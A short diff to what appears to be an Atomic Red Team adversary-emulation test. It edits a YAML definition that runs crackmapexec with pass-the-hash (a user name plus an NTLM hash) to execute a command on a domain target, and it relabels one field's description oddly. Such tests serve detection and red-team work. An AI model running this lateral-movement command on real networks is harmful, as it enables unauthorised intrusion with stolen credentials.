@@ -66,7 +66,7 @@ atomic_tests:
       type: string
       default: 7a0c0f0bd4f14d50f17227cd0206a385
     domain:
-      description: domain
+      description: COMPANYPC1
       type: string
       default: contoso
   dependency_executor_name: powershell
@@ -79,5 +79,5 @@ atomic_tests:
       Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}
   executor:
     command: |
-      crackmapexec #{domain} -u #{user_name} -H #{ntlm} -x #{command}
+      #{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}
     name: command_prompt
